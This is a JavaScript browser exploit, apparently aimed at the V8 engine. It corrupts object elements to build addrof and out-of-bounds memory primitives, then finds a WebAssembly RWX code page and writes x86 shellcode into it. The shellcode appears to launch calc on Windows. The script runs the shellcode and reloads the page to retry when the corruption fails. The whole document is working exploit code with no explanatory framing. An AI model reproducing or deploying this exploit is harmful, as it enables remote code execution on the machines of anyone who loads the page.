// HELPER FUNCTIONS
let conversion_buffer = new ArrayBuffer(16);
let float_view = new Float64Array(conversion_buffer);
let bint_view = new BigUint64Array(conversion_buffer);
let sint_view = new Uint32Array(conversion_buffer);
Number.prototype.float_to_high_32bit = function() {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] >> 32n) & 0xffffffffn;
    return sint_view[0];
}
Number.prototype.float_to_low_32bit = function() {
    float_view[0] = this;
    bint_view[0] = bint_view[0] & 0xffffffffn;
    return sint_view[0];
}
Number.prototype.setHighUint32 = function(val) {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] & 0x00000000ffffffffn) | (BigInt(val) << 32n);
    return float_view[0];
}
Number.prototype.setLowUint32 = function(val) {
    float_view[0] = this;
    bint_view[0] = (bint_view[0] & 0xffffffff00000000n) | BigInt(val);
    return float_view[0];
}

function addrof(o) {
    obj_addrof['b'] = o;
    return float_array[obj_prop_b_offset].float_to_low_32bit();
}

let shellcode = [0x31, 0xD2, 0x52, 0x68, 0x63, 0x61, 0x6C, 0x63,
                 0x54, 0x59, 0x52, 0x51, 0x64, 0x8B, 0x72, 0x30,
                 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x0C, 0xAD, 0x8B,
                 0x30, 0x8B, 0x7E, 0x18, 0x8B, 0x5F, 0x3C, 0x8B,
                 0x5C, 0x1F, 0x78, 0x8B, 0x74, 0x1F, 0x20, 0x01,
                 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C,
                 0x17, 0x42, 0x42, 0xAD, 0x81, 0x3C, 0x07, 0x57,
                 0x69, 0x6E, 0x45, 0x75, 0xF0, 0x8B, 0x74, 0x1F,
                 0x1C, 0x01, 0xFE, 0x03, 0x3C, 0xAE, 0xFF, 0xD7];

const obj_prop_b_offset = 19;
var wfunc = null;
let iter_cnt = 0;
var original;
var float_array;
var tarr;
var obj_addrof;
var view;

function exploit() {
   let xxx = [];
    const o = {foo: 0x41414141};
    for (let i = 0; i < 15; i++) {
        o[i] = i+16;
    }

    // the first corruption target
    float_array = [0x41414141];

    // second corruption target
    tarr = new Uint32Array(2);
    tarr[0] = 0x31313131;
    tarr[1] = 0x32323232;

    view = new DataView(tarr.buffer);

    // object used to imlpement the addrof primitive
    obj_addrof = {'a': 0x31323334/2, 'b': 1};
    obj_addrof['b'] = obj_addrof;

    // build a NumberDictionary inside the FixedArray
    o[0] = 0x08;    // number of elements
    o[1] = 0;       // number of deleted elements
    o[2] = 0x08;    // capacity;
    o[3] = 0x32;    // max key/requires slow elements
    // first element of the NumberDictionary
    o[4] = 0;       // key
    o[5] = 0x4141;  // value
    o[6] = 0xc0;    // PropertyDesc

    Object.seal(o);

    const v12 = {foo: 0x42424242};
    Object.preventExtensions(v12);
    Object.seal(v12);

    const v18 = {foo: Object};
    v12.__proto__ = 0;

    o[0] = 0x4242;

    for (i = 0; i < o.length; i++) {
        console.log('[+] PADDING');
    }

    delete o[1];

    for (i = 0; i < o.length; i++) {
        console.log('[+] PADDING');
    }

    if (float_array[2] !== undefined) {
        console.log('[+] PADDING');
        console.log('[+] PADDING');

        this.exploited = true;

        console.log('[+]-------------------------------------------------------------');
        console.log('[+][addrof] float_array[18]: ' + float_array[obj_prop_b_offset].float_to_low_32bit().toString(16));
        console.log('[+][addrof] addrof(view): ' + addrof(view).toString(16));
        console.log('[+]-------------------------------------------------------------');
        console.log('[+][BEFORE] float_array[4]: ' + float_array[4].float_to_low_32bit().toString(16));
        console.log('[+][BEFORE] float_array[4]: ' + float_array[4].float_to_high_32bit().toString(16));

        // tarr.byteLength
        float_array[3] = float_array[3].setHighUint32(0xC8C8);
        // tarr.length
        float_array[4] = float_array[4].setLowUint32(0xC8C8);
        // tarr.buffer
        // float_array[8] = float_array[8].setHighUint32(0x00400000n);
        // view.byteLength
        float_array[15] = float_array[15].setLowUint32(0xC8C8);

        console.log('[+]-------------------------------------------------------------');
        console.log('[+][AFTER] float_array[4]: ' + float_array[4].float_to_low_32bit().toString(16));
        console.log('[+][AFTER] float_array[4]: ' + float_array[4].float_to_high_32bit().toString(16));
        console.log('[+]-------------------------------------------------------------');
        console.log('[+][OOB] tarr.length: ' + tarr.length);
        console.log('[+][OOB] tarr.byteLength: ' + tarr.byteLength);
        console.log('[+]-------------------------------------------------------------');
        console.log('[+][OOB] view.byteLength: ' + view.byteLength);
        console.log('[+]-------------------------------------------------------------');

        for (i = 0; i < 20; i++) {
            if (i == 0) {
                console.log('[+][64bit][32bit_high_byte] float_array[' + (i*2).toString() + ']: ' + float_array[i].float_to_low_32bit().toString(16));
                console.log('[+][64bit][32bit_low__byte] float_array[' + (i*2+1).toString() + ']: ' + float_array[i].float_to_high_32bit().toString(16));
            }
            else {
                console.log('[+][64bit][32bit_high_byte] float_array[' + (i*2).toString() + ']: ' + float_array[i].float_to_low_32bit().toString(16));
                console.log('[+][64bit][32bit_low__byte] float_array[' + (i*2+1).toString() + ']: ' + float_array[i].float_to_high_32bit().toString(16));
            }
        }

        return true;
    }

    return false;
}

function rce() {
    function get_wasm_func() {
        var importObject = {
            imports: { imported_func: arg => console.log(arg) }
        };
        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
        wasm_code = new Uint8Array(bc);
        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
        return wasm_mod.exports.exported_func;
    }

    let wasm_func = get_wasm_func();
    wfunc = wasm_func;
    console.log('[+] wasm: ' + wfunc);
    // traverse the JSFunction object chain to find the RWX WebAssembly code page
    let wasm_func_addr = addrof(wasm_func) - 1;
    console.log('[+] wasm addr: 0x' + wasm_func_addr.toString(16));
    //--------------------------------------------------------------------------------------
    original = float_array[8].float_to_high_32bit();
    float_array[8] = float_array[8].setHighUint32(wasm_func_addr + (12*2)/2);
    let sfi = view.getUint32(0, true) - 1;
    console.log('[+] sfi: 0x' + sfi.toString(16));
    float_array[8] = float_array[8].setHighUint32(original);
    //--------------------------------------------------------------------------------------
    original = float_array[8].float_to_high_32bit();
    float_array[8] = float_array[8].setHighUint32(sfi + (4*2)/2);
    let WasmExportedFunctionData = view.getUint32(0, true) - 1;
    console.log('[+] WasmExportedFunctionData: 0x' + WasmExportedFunctionData.toString(16));
    float_array[8] = float_array[8].setHighUint32(original);
    //--------------------------------------------------------------------------------------
    original = float_array[8].float_to_high_32bit();
    float_array[8] = float_array[8].setHighUint32(WasmExportedFunctionData + (8*2)/2);
    let instance = view.getUint32(0, true) - 1;
    console.log('[+] instance: 0x' + instance.toString(16));
    float_array[8] = float_array[8].setHighUint32(original);
    //--------------------------------------------------------------------------------------
    original = float_array[8].float_to_high_32bit();
    float_array[8] = float_array[8].setHighUint32(instance + 0x88/2);
    let rwx_addr = view.getUint32(0, true);
    console.log('[+] rwx: 0x' + rwx_addr.toString(16));
    float_array[8] = float_array[8].setHighUint32(original);
    //--------------------------------------------------------------------------------------
    original = float_array[8].float_to_high_32bit();
    float_array[8] = float_array[8].setHighUint32(rwx_addr);
    for (let i = 0; i < shellcode.length; i++) {
        view.setUint8(i, shellcode[i]);
    }
    float_array[8] = float_array[8].setHighUint32(original);
    //--------------------------------------------------------------------------------------
    // invoke the shellcode
    wfunc();
}
try {
    for (iter_cnt = 0; iter_cnt < 500; iter_cnt++) {
        if (exploit()) {
            rce();
        }
    }

    console.log('[!] Float array corruption unsuccessful, RESTARTING!');
    throw ''
} catch {
    // try again
    if (!this.exploited)
        setTimeout(function(){ location.reload(); }, 2000);
}
